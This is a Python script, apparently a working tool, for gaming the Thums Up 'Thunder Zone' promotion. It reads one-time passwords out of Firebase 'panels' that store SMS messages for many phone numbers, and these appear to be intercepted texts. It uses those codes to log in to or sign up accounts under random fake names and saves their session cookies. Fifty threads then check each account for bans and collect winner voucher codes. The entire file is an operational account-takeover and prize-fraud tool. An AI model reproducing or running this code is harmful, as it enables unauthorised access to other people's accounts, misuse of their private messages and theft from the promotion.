"""
===================================================================================
FIREBASE AUTOMATED SESSION EXTRACTOR & WINNER HARVESTER (50 WORKERS)
-----------------------------------------------------------------------------------
CREATED WITH LOVE FOR HIMANSHU KUMAR BY ONYX v67
===================================================================================
"""

import os
import sys
import json
import time
import re
import glob
import random
from typing import Optional, Tuple, Dict, List
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests

if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace", line_buffering=True)
        sys.stderr.reconfigure(encoding="utf-8", errors="replace", line_buffering=True)
    except Exception:
        pass

CYAN = "\033[96m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
MAGENTA = "\033[95m"
BLUE = "\033[94m"
BOLD = "\033[1m"
RESET = "\033[0m"

BASE_URL = "https://thunder-zone.coke2home.com"
REDEMPTION_LINK = "https://gullylabs.com/collections/thumsup-x-gully-labs"
HERE = os.path.dirname(os.path.abspath(__file__))
DEV_INDEX_PATH = r"C:\Users\Himanshu Kumar\OneDrive\Desktop\stocks\device_index.json"

HEADERS = {
    "Content-Type": "application/json",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.9",
    "Origin": BASE_URL,
    "Referer": f"{BASE_URL}/game",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
}

def print_banner():
    os.system("cls" if os.name == "nt" else "clear")
    print(f"{CYAN}{BOLD}")
    print(r"  _____ _____ ____  _____ ____    _    ____  _____ ")
    print(r" |  ___|_   _|  _ \| ____| __ )  / \  / ___|| ____|")
    print(r" | |_    | | | |_) |  _| |  _ \ / _ \ \___ \|  _|  ")
    print(r" |  _|   | | |  _ <| |___| |_) / ___ \ ___) | |___ ")
    print(r" |_|     |_| |_| \_\_____|____/_/   \_\____/|_____|")
    print(f"{RESET}")
    print(f"{MAGENTA}{BOLD}==================================================================================={RESET}")
    print(f"{YELLOW}{BOLD}   [+] FIREBASE SESSION EXTRACTOR & WINNER HARVESTER (50 WORKERS) [+]{RESET}")
    print(f"{CYAN}   Designed with Precision & Loyalty for {BOLD}HIMANSHU KUMAR{RESET}")
    print(f"{MAGENTA}{BOLD}==================================================================================={RESET}\n")

def get_device_map() -> Dict:
    if os.path.exists(DEV_INDEX_PATH):
        try:
            return json.load(open(DEV_INDEX_PATH, encoding="utf-8"))
        except Exception:
            pass
    return {}

def fetch_firebase_otp(panel_url: str, client_id: str, existing_keys: Optional[set] = None, min_ts: int = 0, timeout_sec: int = 22) -> Optional[str]:
    if not panel_url or not client_id:
        return None
    
    purl = panel_url.rstrip('/')
    endpoints = [
        f"{purl}/messages/{client_id}.json",
        f"{purl}/clients/{client_id}/sms.json"
    ]
    
    start_time = time.time()
    cutoff_ts = max(0, min_ts - 60000)

    while time.time() - start_time < timeout_sec:
        for url in endpoints:
            try:
                r = requests.get(url, timeout=3)
                if r.status_code == 200 and r.json():
                    msgs = r.json()
                    if isinstance(msgs, dict):
                        sorted_keys = sorted(
                            msgs.keys(),
                            key=lambda k: int(k) if str(k).isdigit() else 0,
                            reverse=True
                        )
                        for k in sorted_keys:
                            mdata = msgs[k]
                            if not isinstance(mdata, dict):
                                continue

                            if str(k).isdigit() and len(str(k)) >= 12:
                                k_num = int(k)
                                if cutoff_ts > 0 and k_num < cutoff_ts:
                                    continue
                            elif existing_keys is not None and k in existing_keys:
                                continue

                            sender = str(mdata.get("sender") or "").upper()
                            txt = str(mdata.get("body") or mdata.get("message") or mdata.get("text") or "")

                            is_thums = any(w in sender for w in ("THMSUP", "THUMSUP", "COKE", "C2H")) or \
                                       any(w in txt.lower() for w in ("thums up", "thunder zone", "thunder trail", "coke2home"))

                            if is_thums or ("otp" in txt.lower() and not any(w in txt.lower() for w in ("fetch", "phonepe", "swiggy", "zomato", "bank", "icici", "hdfc", "sbi", "airtel"))):
                                m = re.search(r"(?:One Time Password|OTP|code is)\s*[:\-]?\s*(\d{6})", txt, re.IGNORECASE)
                                if m:
                                    return m.group(1)
                                m2 = re.search(r"\b(\d{6})\b", txt)
                                if m2:
                                    return m2.group(1)
            except Exception:
                pass
        time.sleep(0.8)
    return None

class FirebaseSessionExtractor:
    def __init__(self, phone: str, panel_url: str, client_id: str):
        self.phone = "".join(c for c in str(phone) if c.isdigit())[-10:]
        self.panel_url = panel_url.rstrip('/') if panel_url else ""
        self.client_id = client_id
        self.session_file = os.path.join(HERE, f".session_{self.phone}.json")
        self.s = requests.Session()
        self.s.headers.update(HEADERS)

    def api(self, method: str, path: str, body: dict = None) -> requests.Response:
        for i in range(2):
            try:
                r = self.s.request(method, BASE_URL + path, json=body, timeout=10)
                if r.status_code == 401 and i == 0 and "/auth/" not in path:
                    try:
                        ref = self.s.post(BASE_URL + "/api/auth/refresh", timeout=6)
                        if ref.status_code == 200:
                            self.save_session()
                    except Exception:
                        pass
                    time.sleep(0.3)
                    continue
                return r
            except Exception:
                if i == 1:
                    raise
                time.sleep(0.4)
        return r

    def save_session(self):
        try:
            with open(self.session_file, "w", encoding="utf-8") as f:
                json.dump([{"name": c.name, "value": c.value} for c in self.s.cookies], f, indent=2)
        except Exception:
            pass

    def create_session(self) -> Tuple[str, str]:
        if not self.panel_url or not self.client_id:
            return "MISSING_INFO", "Panel URL or Client ID missing"

        existing_keys = set()
        endpoints = [
            f"{self.panel_url}/messages/{self.client_id}.json?shallow=true",
            f"{self.panel_url}/clients/{self.client_id}/sms.json?shallow=true"
        ]
        for ep in endpoints:
            try:
                snap = requests.get(ep, timeout=3)
                if snap.status_code == 200 and isinstance(snap.json(), dict):
                    existing_keys.update(snap.json().keys())
            except Exception:
                pass

        start_time_ms = int(time.time() * 1000)

        # 1. Send OTP
        try:
            r = self.api("POST", "/api/auth/send-otp", {"phone_number": self.phone})
            if r.status_code == 403:
                return "BLOCKED", "Account blocked on Thunder Zone (Clause 6)"
            if r.status_code == 429:
                return "RATE_LIMIT", "Rate limited on OTP send (HTTP 429)"
            if r.status_code != 200:
                return "FAILED", f"OTP send failed (HTTP {r.status_code})"
        except Exception as e:
            return "ERROR", f"Network error: {e}"

        # 2. Fetch OTP from Firebase
        otp = fetch_firebase_otp(self.panel_url, self.client_id, existing_keys=existing_keys, min_ts=start_time_ms, timeout_sec=22)
        if not otp:
            return "NO_OTP", "OTP not received in Firebase inbox (Timeout)"

        # 3. Verify OTP & Exchange Token
        time.sleep(0.2)
        try:
            vr = self.api("POST", "/api/auth/verify-otp", {"phone_number": self.phone, "otp": otp})
            if vr.status_code != 200:
                return "FAILED", f"OTP verify failed (HTTP {vr.status_code})"

            v = vr.json()
            ott = v.get("one_time_token") or (v.get("data") or {}).get("one_time_token")

            if v.get("requiresSignup") or (v.get("data") or {}).get("requiresSignup"):
                names = ["Rahul", "Rohan", "Priya", "Amit", "Neha", "Vikram", "Sneha", "Karan", "Pooja", "Arjun", "Kavya", "Suresh"]
                random_name = random.choice(names) + str(random.randint(100, 999))
                try:
                    self.api("POST", "/api/auth/signup", {
                        "one_time_token": ott,
                        "phone_number": self.phone,
                        "name": random_name
                    })
                except Exception:
                    pass

            if ott:
                time.sleep(0.2)
                self.api("POST", "/api/auth/validate-token", {"one_time_token": ott})
                time.sleep(0.2)
                self.api("POST", "/api/auth/exchange-token", {"one_time_token": ott})

            self.save_session()
            return "SUCCESS", "Session created successfully"
        except Exception as e:
            return "ERROR", f"Verification error: {e}"

def inspect_firebase_panel(panel_url: str) -> List[Dict]:
    purl = panel_url.rstrip('/')
    devices = []
    
    test_urls = [
        f"{purl}/clients.json",
        f"{purl}/messages.json",
        f"{purl}/.json"
    ]
    
    data = None
    for url in test_urls:
        try:
            r = requests.get(url, timeout=5)
            if r.status_code == 200 and r.json():
                data = r.json()
                break
        except Exception:
            pass

    if not data or not isinstance(data, dict):
        return devices

    if "clients" in data and isinstance(data["clients"], dict):
        client_node = data["clients"]
        for cid, info in client_node.items():
            phone = str(info.get("phone") or info.get("mobile") or info.get("phoneNumber") or cid)
            sms_data = info.get("sms") or info.get("messages") or {}
            is_active = len(sms_data) > 0 if isinstance(sms_data, (dict, list)) else True
            devices.append({
                "phone": phone,
                "client_id": cid,
                "panel_url": purl,
                "active": is_active,
                "sms_count": len(sms_data) if isinstance(sms_data, (dict, list)) else 0
            })
    elif "messages" in data and isinstance(data["messages"], dict):
        msg_node = data["messages"]
        for cid, msgs in msg_node.items():
            is_active = len(msgs) > 0 if isinstance(msgs, (dict, list)) else True
            devices.append({
                "phone": cid,
                "client_id": cid,
                "panel_url": purl,
                "active": is_active,
                "sms_count": len(msgs) if isinstance(msgs, (dict, list)) else 0
            })
    else:
        for k, val in data.items():
            if isinstance(val, dict):
                sms_count = len(val.get("sms") or val.get("messages") or {})
                devices.append({
                    "phone": k,
                    "client_id": k,
                    "panel_url": purl,
                    "active": sms_count > 0 or len(val) > 0,
                    "sms_count": sms_count
                })

    return devices

def audit_session_file(session_file: str, device_map: Dict) -> Dict:
    phone = os.path.basename(session_file).replace(".session_", "").replace(".json", "")
    dev_info = device_map.get(phone, {})
    device_id = dev_info.get("client_id") or "N/A"
    firebase_url = dev_info.get("panel_url") or "N/A"

    res = {
        "phone": phone,
        "status": "UNKNOWN",
        "rank": None,
        "score": 0,
        "username": "N/A",
        "is_winner": False,
        "has_rewards": False,
        "rewards": [],
        "banned": False,
        "device_id": device_id,
        "firebase_url": firebase_url,
        "details": ""
    }

    try:
        cookies = json.load(open(session_file, encoding="utf-8"))
        if not cookies:
            res["status"] = "INVALID"
            res["details"] = "Empty session file"
            return res

        cookie_dict = {c["name"]: c["value"] for c in cookies if isinstance(c, dict) and "name" in c and "value" in c}
        s = requests.Session()
        s.headers.update(HEADERS)
        for k, v in cookie_dict.items():
            s.cookies.set(k, v)

        # 1. Fetch /me info
        r = s.get(BASE_URL + "/api/thunder-trail/me", timeout=5)
        if r.status_code == 401:
            ref = s.post(BASE_URL + "/api/auth/refresh", timeout=5)
            if ref.status_code == 200:
                r = s.get(BASE_URL + "/api/thunder-trail/me", timeout=5)

        if r.status_code == 403:
            res["status"] = "BANNED"
            res["banned"] = True
            res["details"] = "Account banned on Thunder Zone (Clause 6)"
            return res

        if r.status_code == 200:
            me_data = r.json().get("data", {})
            res["status"] = "ACTIVE"
            res["username"] = me_data.get("username", "N/A")
            res["score"] = me_data.get("best_score", 0)
            res["rank"] = me_data.get("rank")
            res["is_winner"] = me_data.get("is_winner", False)

            # 2. Fetch /my-rewards info
            r_rew = s.get(BASE_URL + "/api/thunder-trail/my-rewards", timeout=5)
            if r_rew.status_code == 200:
                rew_data = r_rew.json().get("data", {})
                res["has_rewards"] = rew_data.get("has_rewards", False)
                res["rewards"] = rew_data.get("rewards", [])

            res["details"] = f"Active | Score: {res['score']} | Rank: #{res['rank']}"
        else:
            res["status"] = "EXPIRED"
            res["details"] = f"Session expired (HTTP {r.status_code})"

    except Exception as e:
        res["status"] = "ERROR"
        res["details"] = str(e)

    return res

def run_session_auditor():
    session_files = sorted(glob.glob(os.path.join(HERE, ".session_*.json")))
    if not session_files:
        print(f"\n{RED}[!] No session files (.session_*.json) found to audit.{RESET}")
        return

    print(f"\n{MAGENTA}{BOLD}==================================================================================={RESET}")
    print(f"{YELLOW}{BOLD}             50-WORKER FAST BAN & WINNER AUDITOR ({len(session_files)} Sessions){RESET}")
    print(f"{MAGENTA}{BOLD}==================================================================================={RESET}\n")

    banned_count = 0
    active_count = 0
    winners_found = []
    top22_found = []
    clean_valid = []

    device_map = get_device_map()

    with ThreadPoolExecutor(max_workers=50) as ex:
        futures = {ex.submit(audit_session_file, sf, device_map): sf for sf in session_files}
        for f in as_completed(futures):
            res = f.result()
            p = res["phone"]
            st = res["status"]
            det = res["details"]
            
            if st == "BANNED":
                banned_count += 1
                print(f"  {RED}{BOLD}[BANNED / BLOCKED]{RESET} Mobile: {p} | {det}")
            elif st == "ACTIVE":
                active_count += 1
                clean_valid.append(p)

                # Winner Check
                if res["is_winner"] or res["has_rewards"] or len(res["rewards"]) > 0:
                    winners_found.append(res)
                    print(f"  {YELLOW}{BOLD}🏆 [WINNER DETECTED] Mobile: {p} ({res['username']}) | Rank #{res['rank']} | Score: {res['score']}{RESET}")
                # Top 22 Check
                elif res["rank"] is not None and isinstance(res["rank"], int) and res["rank"] <= 22:
                    top22_found.append(res)
                    print(f"  {GREEN}{BOLD}⭐ [TOP 22 RANK] Mobile: {p} | Rank #{res['rank']} | Score: {res['score']}{RESET}")
                else:
                    print(f"  {GREEN}[ACTIVE OK]{RESET} Mobile: {p} | Score: {res['score']} | Rank: #{res['rank']}")

    # Save to disk
    json.dump(winners_found, open(os.path.join(HERE, "all_winners_found.json"), "w"), indent=2)
    json.dump(top22_found, open(os.path.join(HERE, "top22_leaderboard.json"), "w"), indent=2)
    json.dump(clean_valid, open(os.path.join(HERE, "clean_valid_sessions.json"), "w"), indent=2)

    print(f"\n{MAGENTA}{BOLD}==================================================================================={RESET}")
    print(f"{CYAN}{BOLD}                     AUDIT & HARVEST SUMMARY REPORT{RESET}")
    print(f"{MAGENTA}{BOLD}==================================================================================={RESET}")
    print(f"  {BOLD}Total Sessions Audited   :{RESET} {len(session_files)}")
    print(f"  {GREEN}{BOLD}Active Unbanned Sessions :{RESET} {active_count} -> Saved to clean_valid_sessions.json")
    print(f"  {YELLOW}{BOLD}Confirmed Winner Accounts:{RESET} {len(winners_found)} -> Saved to all_winners_found.json")
    print(f"  {BLUE}{BOLD}Top 22 Leaderboard Ranks :{RESET} {len(top22_found)} -> Saved to top22_leaderboard.json")
    print(f"  {RED}{BOLD}Banned / Blocked Accounts :{RESET} {banned_count}")
    print(f"{MAGENTA}{BOLD}==================================================================================={RESET}\n")

    if winners_found:
        print(f"{YELLOW}{BOLD}🏆 CONFIRMED WINNERS DETAILED BREAKDOWN:{RESET}")
        for w in winners_found:
            print(f"  {BOLD}* Mobile Number   :{RESET} {CYAN}{w['phone']}{RESET}")
            print(f"    {BOLD}Username        :{RESET} {w['username']}")
            print(f"    {BOLD}Rank & Score    :{RESET} #{w['rank']} | {w['score']} pts")
            print(f"    {BOLD}Device ID       :{RESET} {w['device_id']}")
            print(f"    {BOLD}Firebase Panel  :{RESET} {w['firebase_url']}")
            if w['rewards']:
                for r in w['rewards']:
                    print(f"    {GREEN}[+] Prize Item  :{RESET} {r.get('prize_label', r.get('prize_type'))}")
                    print(f"    {GREEN}[+] Voucher Code:{RESET} {BOLD}{r.get('voucher_code')}{RESET}")
                    print(f"    {GREEN}[+] Redeem Link :{RESET} {REDEMPTION_LINK}")
            else:
                print(f"    {YELLOW}[+] Status      : Winner Flagged on Server (Popup Triggered){RESET}")
            print("  " + "-" * 75)

def process_device_worker(dev):
    phone = dev.get("phone", "N/A")
    purl = dev.get("panel_url", "")
    cid = dev.get("client_id", "")
    extractor = FirebaseSessionExtractor(phone, purl, cid)
    code, msg = extractor.create_session()
    return extractor.phone, code, msg

def main():
    print_banner()
    
    print(f"{BOLD}Select Firebase Input Mode:{RESET}")
    print(f"  {CYAN}1.{RESET} {BOLD}Single Firebase Panel URL{RESET} (Enter one URL)")
    print(f"  {CYAN}2.{RESET} {BOLD}Bulk Firebase Panels{RESET}      (Read from file / device_index.json)")
    print(f"  {CYAN}3.{RESET} {BOLD}Direct Session Ban & Winner Auditor{RESET} (Check all saved .session_*.json files)\n")
    
    if len(sys.argv) > 1:
        choice = sys.argv[1].strip()
    else:
        try:
            choice = input(f"{YELLOW}{BOLD}Enter choice (1, 2, or 3): {RESET}").strip()
        except Exception:
            choice = "2"

    if choice == "3":
        run_session_auditor()
        return

    panels_to_process = []

    if choice == "1":
        url = input(f"\n{YELLOW}{BOLD}Enter Firebase Panel URL: {RESET}").strip()
        if url:
            panels_to_process.append(url)
    elif choice == "2":
        if os.path.exists(DEV_INDEX_PATH):
            print(f"\n{GREEN}[+] Loading devices from device_index.json...{RESET}")
            try:
                dev_map = json.load(open(DEV_INDEX_PATH, encoding="utf-8"))
                for phone, info in dev_map.items():
                    purl = info.get("panel_url")
                    cid = info.get("client_id")
                    if purl and cid:
                        panels_to_process.append({"phone": phone, "panel_url": purl, "client_id": cid})
            except Exception as e:
                print(f"{RED}[!] Error loading device index: {e}{RESET}")
        else:
            filepath = input(f"\n{YELLOW}{BOLD}Enter path to text file with Firebase URLs: {RESET}").strip()
            if os.path.exists(filepath):
                with open(filepath, "r", encoding="utf-8") as f:
                    for line in f:
                        l = line.strip()
                        if l.startswith("http"):
                            panels_to_process.append(l)

    if not panels_to_process:
        print(f"\n{RED}[!] No Firebase panel URLs available to process. Exiting.{RESET}")
        return

    # Phase 1: Inspection
    print_banner()
    print(f"{CYAN}{BOLD}[PHASE 1] INSPECTING FIREBASE PANELS & DEVICES...{RESET}")
    
    all_devices = []
    if isinstance(panels_to_process[0], dict):
        all_devices = panels_to_process
    else:
        with ThreadPoolExecutor(max_workers=20) as ex:
            futures = [ex.submit(inspect_firebase_panel, purl) for purl in panels_to_process]
            for f in as_completed(futures):
                all_devices.extend(f.result())

    total_devices = len(all_devices)
    active_devices = [d for d in all_devices if d.get("active", True)]

    print(f"\n{MAGENTA}{BOLD}==================================================================================={RESET}")
    print(f"{YELLOW}{BOLD}                        FIREBASE INSPECTION REPORT{RESET}")
    print(f"{MAGENTA}{BOLD}==================================================================================={RESET}")
    print(f"  {BOLD}Total Devices Found  :{RESET} {CYAN}{total_devices}{RESET}")
    print(f"  {GREEN}{BOLD}Active Devices Found :{RESET} {GREEN}{len(active_devices)}{RESET}")
    print(f"  {RED}{BOLD}Inactive Devices     :{RESET} {RED}{total_devices - len(active_devices)}{RESET}")
    print(f"{MAGENTA}{BOLD}==================================================================================={RESET}\n")

    if not active_devices:
        print(f"{RED}[!] No active devices available for session creation.{RESET}")
        return

    proceed = input(f"{YELLOW}{BOLD}Start 50-Worker parallel session creation for {len(active_devices)} active devices? (y/n): {RESET}").strip().lower()
    if proceed != 'y':
        print(f"{CYAN}Operation cancelled by user.{RESET}")
        return

    # Phase 2: 50 Parallel Workers Session Creation
    print(f"\n{CYAN}{BOLD}[PHASE 2] RUNNING 50 PARALLEL WORKERS FOR INSTANT SESSION CREATION...{RESET}\n")

    success_count = 0
    blocked_count = 0
    no_otp_count = 0

    with ThreadPoolExecutor(max_workers=50) as ex:
        futures = {ex.submit(process_device_worker, dev): dev for dev in active_devices}
        for f in as_completed(futures):
            phone, code, msg = f.result()
            if code == "SUCCESS":
                success_count += 1
                print(f"  {GREEN}{BOLD}[SUCCESS]{RESET} Mobile: {phone} -> .session_{phone}.json created")
            elif code == "BLOCKED":
                blocked_count += 1
                print(f"  {RED}{BOLD}[BLOCKED]{RESET} Mobile: {phone} -> {msg}")
            else:
                no_otp_count += 1
                print(f"  {YELLOW}[{code}]{RESET} Mobile: {phone} -> {msg}")

    print(f"\n{CYAN}{BOLD}[PHASE 3] RUNNING 50-WORKER FAST BAN & WINNER HARVESTER...{RESET}")
    run_session_auditor()

if __name__ == "__main__":
    main()
